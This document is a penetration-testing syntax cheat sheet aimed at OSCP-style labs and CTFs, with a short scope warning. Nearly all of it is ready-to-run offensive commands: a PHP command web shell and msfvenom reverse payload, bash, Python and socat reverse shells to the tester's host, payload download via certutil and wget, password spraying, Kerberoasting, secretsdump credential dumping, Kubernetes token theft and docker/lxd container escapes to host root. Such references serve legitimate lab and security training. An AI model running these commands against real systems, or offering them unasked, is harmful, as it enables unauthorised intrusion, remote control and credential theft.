# Pentest syntax cheat sheet

Placeholders: `<ip>` target, `<host>` hostname/FQDN, `<user>` `<pass>` creds, `<domain>` AD domain, `<lhost>` your VPN IP, `<lport>` your listener port.

Set these once per box and reuse:

```bash
export IP=10.10.10.10
export LHOST=$(ip -4 addr show tun0 | grep -oP 'inet \K[\d.]+')   # your VPN IP
export LPORT=443
```

---

## Scope and tool rules (read this first)

Run this against systems you own, a lab or CTF you are registered with, or an engagement with a signed scope. Nothing else.

**On a certification exam** the tooling is usually restricted, and the OSCP rules are the strictest you are likely to meet:

Allowed: manual tools, nmap, targeted nmap scripts, one-off exploits, `netexec`, impacket, evil-winrm, Burp community, linpeas/winpeas, targeted Metasploit **on a single machine only**.

Not allowed: `sqlmap`, automated exploitation (db_autopwn, browser_autopwn), mass vulnerability scanners (Nessus, OpenVAS; Nikto is fine as it is not an exploit scanner but treat with care), and Metasploit auto-exploit beyond your one permitted box. When in doubt, do it by hand.

On a CTF or your own lab none of that applies — but working by hand is still how you learn what the automated tool was doing.

---

## Port scanning

```bash
# Fast full TCP sweep, then version + default scripts on what is open
nmap -p- --min-rate 10000 -T4 -Pn $IP -oN allports.nmap
ports=$(grep -oP '^\d+(?=/tcp)' allports.nmap | paste -sd, -)
nmap -sCV -p$ports -Pn $IP -oN detailed.nmap

# UDP (slow, top ports only)
sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap

# rustscan alternative (faster discovery)
rustscan -a $IP -- -sCV
```

---

## FTP (21)

```bash
nmap -p21 --script ftp-anon,ftp-syst $IP
ftp $IP                       # user: anonymous  pass: anything
# inside ftp:  binary   |   prompt off   |   mget *   |   put <file>
wget -r ftp://anonymous:anon@$IP/     # pull everything
```

## SSH (22)

```bash
nmap -p22 --script ssh-auth-methods,ssh2-enum-algos $IP
ssh <user>@$IP
ssh -i id_rsa <user>@$IP      # with a found key (chmod 600 id_rsa first)
ssh2john id_rsa > hash        # crack an encrypted key
```

## SMTP (25)

```bash
nmap -p25 --script smtp-commands,smtp-enum-users $IP
smtp-user-enum -M VRFY -U users.txt -t $IP
```

## DNS (53)

```bash
dig axfr @$IP <domain>        # zone transfer
dnsrecon -d <domain> -n $IP
nslookup                      # then: server $IP  ->  <domain>
```

## Web (80/443/8080/...)

```bash
whatweb -a3 http://$IP
curl -sSik http://$IP/robots.txt
nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP

# directory brute (pick one). -d 2 stops ferox recursing into a phone book
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# vhost / subdomain fuzz (add <host> to /etc/hosts first)
ffuf -u http://$IP -H "Host: FUZZ.<host>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>

# WordPress
curl -s http://$IP/readme.html | grep -i version                 # core version
wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token <token>
cmsmap -f W http://$IP                                            # alt scanner (also J/D/M); -F full, noisy
curl -s http://$IP/wp-json/wp/v2/users                           # user enum via REST API
wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login brute
# admin panel -> Appearance > Theme Editor > 404.php = PHP shell ; wp-config.php holds the DB creds

# PHP shells to upload
echo '<?php system($_GET["cmd"]); ?>' > cmd.php          # then browse cmd.php?cmd=id
cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp <port>, browse it
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

Reminder: if the browser redirects to a name, `echo "$IP <host>" | sudo tee -a /etc/hosts`.

## SMB (139/445)

```bash
nxc smb $IP                                   # OS / domain / signing
nxc smb $IP -u '' -p '' --shares              # null session
nxc smb $IP -u guest -p '' --shares
nxc smb $IP -u <user> -p <pass> --shares
enum4linux-ng -A $IP
smbmap -H $IP -u guest -p ''
smbclient -L //$IP/ -N                         # list shares
smbclient //$IP/<share> -N                     # connect (or -U '<user>%<pass>')
smbclient //$IP/<share> -N -c 'recurse ON; ls' # walk a share

# password spray / cred check across a subnet
nxc smb $IP -u users.txt -p 'Password1' --continue-on-success
```

## SNMP (161/udp)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # running processes
```

## LDAP (389/636)

```bash
nmap -p389 --script ldap-rootdse $IP
ldapsearch -x -H ldap://$IP -s base -b '' namingContexts
ldapsearch -x -H ldap://$IP -b '<baseDN>' > ldap_dump.txt
```

## Databases

```bash
# MSSQL 1433
impacket-mssqlclient <user>:<pass>@$IP            # add -windows-auth for domain
# MySQL 3306
mysql -h $IP -u root -p
# PostgreSQL 5432
psql -h $IP -U postgres
# Redis 6379
redis-cli -h $IP        # then: info | keys * | config get dir
```

## RDP / WinRM

```bash
xfreerdp /v:$IP /u:<user> /p:<pass> +clipboard /dynamic-resolution
nxc winrm $IP -u <user> -p <pass>
evil-winrm -i $IP -u <user> -p <pass>
evil-winrm -i $IP -u <user> -H <ntlm-hash>       # pass-the-hash
```

## Active Directory (88 present = DC)

```bash
kerbrute userenum -d <domain> --dc $IP users.txt
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
impacket-secretsdump <domain>/<user>:<pass>@$IP
bloodhound-python -d <domain> -u <user> -p <pass> -ns $IP -c all
```

---

## Reverse shells

```bash
# listener
nc -lvnp $LPORT
rlwrap nc -lvnp $LPORT     # nicer, with history/arrows

# bash
bash -c 'bash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1'
# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Best source for one-liners in a pinch: revshells.com (run it locally, or just remember the site).

## Upgrade a dumb shell to a full TTY

```bash
# 1. ON TARGET: spawn a PTY  (no python3? use:  script -qc /bin/bash /dev/null)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. press Ctrl-Z  -> drops you to your own Kali prompt

# 3. ON KALI. Paste both lines together. Screen goes blank/no-echo, that's normal, press Enter
stty raw -echo
fg

# 4. ON TARGET: fix the environment
export TERM=xterm
export SHELL=/bin/bash

# 5. size it: run 'stty size' in a spare Kali tab to get 'rows cols', then ON TARGET:
stty rows 38 cols 190

# terminal wrecked? on Kali:  reset    (or)  stty sane
# cleanest if target has socat (perfect TTY, no stty dance):
#   kali:   socat file:$(tty),raw,echo=0 tcp-listen:4444
#   target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```

## File transfer

```bash
# on your box: serve the folder
python3 -m http.server 80
# on target (Linux)
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST/x -o /tmp/x
# on target (Windows)
certutil -urlcache -f http://$LHOST/nc.exe nc.exe
powershell -c "iwr http://$LHOST/x.exe -o x.exe"
# via SMB (Windows pull)
impacket-smbserver share . -smb2support     # your box
copy \\$LHOST\share\file.exe                 # target
```

## Privilege escalation, first moves

```bash
# Linux
./linpeas.sh | tee linpeas.txt
sudo -l
find / -perm -4000 -type f 2>/dev/null       # SUID
getcap -r / 2>/dev/null                       # capabilities
crontab -l; cat /etc/crontab
# check GTFOBins for anything you find in sudo -l or SUID

# Windows
.\winpeas.exe
whoami /priv                                  # look for SeImpersonate -> potato
systeminfo                                    # then windows-exploit-suggester
```

## Container escape

```bash
# am I in a container, and which runtime?
ls -la /.dockerenv /run/.containerenv 2>/dev/null   # docker / podman
cat /proc/1/cgroup                                  # docker / lxc / kubepods
env | grep -i KUBERNETES                            # a pod

# enumerate the confinement (the escape is almost always one of these)
capsh --print 2>/dev/null; grep Cap /proc/self/status   # CAP_SYS_ADMIN / PTRACE / DAC_READ_SEARCH
ls -la /var/run/docker.sock 2>/dev/null             # mounted socket = game over
mount; fdisk -l 2>/dev/null                         # host mounts / privileged (sees host disks)
id | grep -E 'docker|lxd|lxc'                        # group membership is root-equivalent

# docker socket or docker group -> root on the host
docker run -v /:/host -it alpine chroot /host bash

# privileged container -> mount the host disk
mkdir /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash

# lxd group -> privileged container mounting /
lxc init esc r -c security.privileged=true
lxc config device add r host disk source=/ path=/mnt/root recursive=true
lxc start r; lxc exec r sh

# kubernetes pod -> node
cat /run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list            # create pods -> schedule a privileged hostPath pod

# CAP_SYS_ADMIN (AppArmor off/permissive): cgroup release_agent break-out -> HackTricks
# CVE-2019-5736: overwrite host runc from inside, fires on the next 'docker exec'
# automation: ./deepce.sh   |   cdk evaluate --full
```

## Password cracking

```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
hashcat --example-hashes | grep -i <type>      # find the right mode
```

## searchsploit

```bash
searchsploit <product> <version>
searchsploit -m <id>          # copy exploit to cwd
searchsploit -x <id>          # view it
```

---

## The loop to run on every box

1. Full TCP scan, then `-sCV` on the open ports.
2. For each service, enumerate it fully before moving on. Do not tunnel-vision on port 80.
3. Note every version string and `searchsploit` it.
4. Add hostnames to `/etc/hosts` the moment you see one.
5. Get any foothold, upgrade the shell, run peas, check `sudo -l`.
6. Keep notes as you go. Screenshot proof.txt with `type`/`cat` plus `whoami` and `ip`.
